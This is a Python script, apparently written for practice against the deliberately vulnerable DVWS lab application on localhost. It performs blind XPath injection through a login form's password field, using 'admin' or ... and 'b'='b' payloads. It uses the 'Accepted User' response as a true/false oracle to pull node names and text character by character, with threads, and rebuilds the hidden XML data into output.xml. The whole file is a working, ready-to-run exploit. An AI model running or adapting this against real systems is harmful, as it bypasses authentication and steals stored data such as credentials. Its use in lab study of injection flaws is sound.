#!/usr/bin/python3

import requests
import string
import xml.etree.ElementTree as ET
import concurrent.futures



def inject(payload): ## function that returns True in the case of a success condition
    url = "http://127.0.0.1:80/dvws/vulnerabilities/xpath/xpath.php"
    username = "admin"
    password = f"admin' or {payload} and 'b'='b"
    params = {"login": username, "password": password, "form": "submit"}
    try:
        resp = requests.get(url, params=params)
    except requests.ConnectionError:
        return False
    return "Accepted User" in resp.text
    

def extract_data(data, path, index):
    if data == "node":
        query = fr"substring(name({path}/*[{index}])"
        charspace = string.ascii_lowercase + string.ascii_uppercase + "0123456789" + "."
        
    elif data == "content":
        newpath = "/" + "/".join(path.split("/")[1:-1])
        node = "/" + path.split("/")[-1]
        query = fr"substring({newpath}[position()={index}]{node}"
        charspace = "".join(chr(i) for i in range(ord(" "), ord("~") + 1) if chr(i) not in ["'",'"',])
        
    skeleton = r"{},{},1)='{}'"
    output = ""
    current_char = "1"
    done = False
    while True:
        for char in charspace:
            if inject(skeleton.format(query, current_char, char)):
                output += char
                current_char = str(int(current_char)+1)
                done = False
        if done == True:
            break
        done = True
    if output and data=="node":
        print("Node: " + output)
    return output
    

    
def map_helper(args):
    return extract_data(args[0], args[1], args[2])



def get_number_of_children(node):
    current_count = 0
    while True:
        query = f"count({node}/*)={current_count}"
        if inject(query):
            return current_count
        current_count += 1



def all_nodes_extracted_check(tree, depth):
    queue = [i[0] for i in tree[depth]]
    index = 0
    output = True
    while index < len(queue) and output:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            threads = [queue[thread] for thread in range(index,min(index+5, len(queue)))]
            for result in executor.map(get_number_of_children, threads):
                if result != 0:
                    output = False
        index += 5
    return output


    
def gen_xml():
    tree = {1:[]}
    depth = 1
    root = extract_data("node", "", 1)
    tree[1].append(("/"+root,(ET.Element(root))))
    nodes_done = False
    while not nodes_done:
        tree[depth+1] = []
        for idx, i in enumerate(tree[depth]):
            index = 1
            done = False
            while not done:
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    threads = [("node", tree[depth][idx][0], thread) for thread in range(index,index+5)]
                    for result in executor.map(map_helper, threads):
                        if result == "":
                            done = True
                        else:
                            count = 1
                            node = tree[depth][idx][0]+"/"+result
                            for j in tree[depth+1]:
                                path = j[0].rstrip("0123456789[]")
                                if node == path:
                                   count += 1
                            node = f"{node}[{count}]"
                            tree[depth+1].append((node, ET.SubElement(tree[depth][idx][1], result)))
                index += 5
        
        if all_nodes_extracted_check(tree, depth):
            nodes_done = True
        depth += 1

    queue = []
    for depth in tree:
        for idx, i in enumerate(tree[depth]):
            if len(i[1]) == 0: # Check if ET Element has no child nodes
                queue.append((depth, idx))

    index = 0
    while index < len(queue):
        with concurrent.futures.ThreadPoolExecutor() as executor:
            threads = [("content", tree[queue[i][0]][queue[i][1]][0], 1) for i in range(index, min(index + 5, len(queue)))]
            for idx, result in enumerate(executor.map(map_helper, threads), start=index):
                print(tree[queue[idx][0]][queue[idx][1]][0].split("/")[-1].capitalize() + ": " + result)
                tree[queue[idx][0]][queue[idx][1]][1].text = result
        index += 5
                
    final_tree = ET.ElementTree(tree[1][0][1])
    ET.indent(final_tree)
    final_tree.write("output.xml")
    print("Done! output.xml created!")
    

def main():
    gen_xml()
    
if __name__ == "__main__":
    main()